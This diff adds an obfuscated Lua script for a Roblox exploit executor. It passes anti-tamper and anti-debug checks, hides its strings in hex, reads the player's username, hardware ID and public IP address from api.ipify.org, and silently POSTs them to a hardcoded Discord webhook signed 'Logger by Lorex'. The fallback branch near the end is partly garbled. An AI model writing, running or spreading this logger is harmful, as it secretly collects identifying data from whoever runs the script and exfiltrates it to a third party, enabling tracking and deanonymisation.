@@ -1,0 +1,268 @@
+local Env = getfenv();
+local h = {};
+local v1 = {...};
+local r1 = true;
+local r2 = string.gmatch;
+local function r3(...)
+    error("Tamper Detected!");
+    return; 
+end;
+local r4 = false;
+local v2 = pcall(function(...)
+    r4 = true;
+    return; 
+end);
+local v3 = v2;
+if v2 then
+    v3 = r4;
+end;
+local v4 = 1;
+local r5 = math.random;
+local v5 = table.concat;
+local function v6(...)
+    while true do
+        l1 = l2;
+        l2 = l1;
+        r3(); 
+    end;
+    return; 
+end;
+local r6 = table and table.unpack or unpack;
+local r7 = r5(3, 65);
+local v7 = {
+    pcall(function(...)
+        return "CIFpfzRqe7t36" / (16062018 - "a9" ^ 4463844); 
+    end)
+};
+local v8 = v7[2];
+local r8 = tonumber(r2(tostring(v8), ":(%d*):")());
+for x = 1, r7 do
+    r9 = x;
+    r10 = math.random(1, 100);
+    r11 = r5(0, 255);
+    r12 = r5(1, r10);
+    r13 = r5(1, 2) == 1;
+    r14 = v8.gsub(v8, ":(%d*):", ":" .. tostring(r5(0, 10000)) .. ":");
+    a = {
+        pcall(function(...)
+            if r5(1, 2) == 1 or r9 == r7 then
+                r1 = r1 and r8 == tonumber(r2(tostring(({
+                    pcall(function(...)
+                        return "3S9JvUzUZD0" / (4408971 - "i6IqmtnHKK" ^ 10558564); 
+                    end)
+                })[2]), ":(%d*):")());
+            end;
+            if r13 then
+                error(r14, 0);
+            end;
+            v1 = {};
+            for n = 1, r10 do
+                v1[n] = r5(0, 255); 
+            end;
+            v1[r12] = r11;
+            return r6(v1); 
+        end)
+    };
+    if r13 then
+        r1 = r1 and (pcall(function(...)
+            if r5(1, 2) == 1 or r9 == r7 then
+                r1 = r1 and r8 == tonumber(r2(tostring(({
+                    pcall(function(...)
+                        return "3S9JvUzUZD0" / (4408971 - "i6IqmtnHKK" ^ 10558564); 
+                    end)
+                })[2]), ":(%d*):")());
+            end;
+            if r13 then
+                error(r14, 0);
+            end;
+            v1 = {};
+            for n = 1, r10 do
+                v1[n] = r5(0, 255); 
+            end;
+            v1[r12] = r11;
+            return r6(v1); 
+        end) == false and a[2] == r14);
+    end; 
+end;
+r1 = r1 and 0 == 0;
+if r1 then
+    r17 = math.floor;
+    v7 = {};
+    v4 = table.remove;
+    r18 = 0;
+    r19 = 2;
+    r20 = {};
+    v = 0;
+    for w = 1, 256 do
+        v7[w] = w; 
+    end;
+    v8 = #v7 == 0;
+    w = v4(v7, math.random(1, #v7));
+    r20[w] = string.char(w - 1);
+    if #v7 == 0 then
+        r21 = {};
+        r23 = {};
+        r15 = setmetatable({}, {
+            ["__index"] = r23,
+            ["__metatable"] = nil
+        });
+        v4 = getgenv;
+        n = "table";
+        if v4 then
+            n = getgenv();
+        end;
+        v5 = h[D];
+        r24 = n;
+        if type(r24) ~= "table" then
+            r24 = _G;
+        end;
+        r25 = rawget;
+        r26 = pcall;
+        r27 = type;
+        r28 = tostring;
+        local function v4(arg1_2, ...)
+            D = {};
+            v1 = arg1_2;
+            for n = 1, #v1, 2 do
+                table.insert(D, string.char(tonumber(v1.sub(v1, n, n + 1), 16))); 
+            end;
+            return table.concat(D); 
+        end;
+        r29 = v4("72657175657374");
+        r30 = v4("687474705f72657175657374");
+        r31 = v4("67657468776964");
+        r32 = v4("504f5354");
+        r33 = v4("474554");
+        r34 = v4("55726c");
+        r35 = v4("4d6574686f64");
+        r36 = v4("48656164657273");
+        r37 = v4("426f6479");
+        r38 = v4("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313530343932313536313233393531393339342f625f7074497368644d656939596d696a3849675f7a3833734557626431666e5a396c69507a73354d7555666a5f417947566a2d3536716e696571657746424e50646e6d5a");
+        r39 = v4("68747470733a2f2f6170692e69706966792e6f7267");
+        r40 = v4("f09f9492204e6577207265706f7274");
+        r41 = v4("f09f91a4204e69636b6e616d65");
+        r42 = v4("f09f8c902049502041646472657373");
+        r43 = v4("f09f92bb2048574944");
+        r44 = v4("4c6f67676572206279204c6f726578");
+        r45 = (function(...)
+            v1 = r25(r24, r29) or r25(r24, r30);
+            if r27(v1) == "function" then
+                return v1;
+            end;
+            return nil; 
+        end)();
+        if r27(r45) ~= "function" then
+            return;
+        end;
+        r46 = "Unknown";
+        r47 = "Unknown";
+        r48 = "Unknown";
+        r26(function(...)
+            v5 = game;
+            v1 = v5.GetService(v5, "Players");
+            if v1 then
+                v3 = v1.LocalPlayer;
+            end;
+            if v1 then
+                r46 = v1.LocalPlayer.Name;
+            end;
+            return; 
+        end);
+        r26(function(...)
+            v1 = r25(r24, r31);
+            if r27(v1) == "function" then
+                D = v1();
+                v3 = D;
+                if D then
+                    v3 = r28(D) ~= "";
+                end;
+                if v3 then
+                    v3 = r28(D);
+                    v5 = v3.gsub(v3, "[\n\r]", "");
+                    v3 = v5.gsub(v5, "\"", "\\\"");
+                    r47 = v3.gsub(v3, "\\", "\\\\");
+                end;
+            end;
+            return; 
+        end);
+        r26(function(...)
+            v1 = {};
+            v1[r34] = r39;
+            v1[r35] = r33;
+            v1[r36] = {
+                ["User-Agent"] = "Roblox/WinInet"
+            };
+            D = r45(v1);
+            if D then
+                v3 = D.Body;
+            end;
+            if D then
+                v3 = r28(D.Body);
+                v5 = v3.gsub(v3, "%s+", "");
+                if #v5 >= 7 and #v5 <= 15 then
+                    v5 = v5;
+                    r48 = v5;
+                end;
+            end;
+            return; 
+        end);
+        local function r49(arg1_3, arg2_3, arg3_3, ...)
+            v3 = r28(arg1_3);
+            v5 = v3.gsub(v3, "\"", "\\\"");
+            return "{\"embeds\":[{" .. "\"title\":\"" .. r40 .. "\"," .. "\"color\":2830129," .. "\"fields\":[" .. "{\"name\":\"" .. r41 .. "\",\"value\":\"```" .. v5.gsub(v5, "\\", "\\\\") .. "```\",\"inline\":true}," .. "{\"name\":\"" .. r42 .. "\",\"value\":\"```" .. arg2_3 .. "```\",\"inline\":true}," .. "{\"name\":\"" .. r43 .. "\",\"value\":\"```" .. arg3_3 .. "```\",\"inline\":false}" .. "]," .. "\"footer\":{\"text\":\"" .. r44 .. "\"}," .. "\"timestamp\":\"" .. os.date("!%Y-%m-%dT%H:%M:%SZ") .. "\"}]}"; 
+        end;
+        local function tX(...)
+            r50 = {};
+            r50[r34] = r38;
+            r50[r35] = r32;
+            r50[r36] = {
+                ["Content-Type"] = "application/json"
+            };
+            r50[r37] = r49(r46, r48, r47);
+            r26(function(...)
+                r45(r50);
+                return; 
+            end);
+            return; 
+        end;
+        ZX = r25(r24, "newcclosure");
+        jX = v5;
+        hX = r27(ZX) == "function" and ZX(tX);
+        v5 = v5;
+        CX = hX;
+        if hX then
+            v5 = v5;
+            hX = r25(r24, "task");
+            v5 = v5;
+            if r27(hX) == "table" and r27(r25(hX, "spawn")) == "function" then
+                rawget(hX, "spawn")(hX);
+            else
+                coroutine.resume(coroutine.create(hX));
+            end;
+            return;
+        else
+            local function CX(...)
+                r50 = {};
+                r50[h[H]] = h[J];
+                r50[h[G]] = h[w];
+                r50[h[c]] = {
+                    ["Content-Type"] = "application/json"
+                };
+                r50[h[I]] = h[oX](h[NX], h[dX], h[WX]);
+                r26(function(...)
+                    h[pX](r50);
+                    return; 
+                end);
+                return; 
+            end;
+        end;
+    end;
+end;
+return (function(...)
+    while true do
+        l1 = l2;
+        l2 = l1;
+        r3(); 
+    end;
+    return; 
+end)();
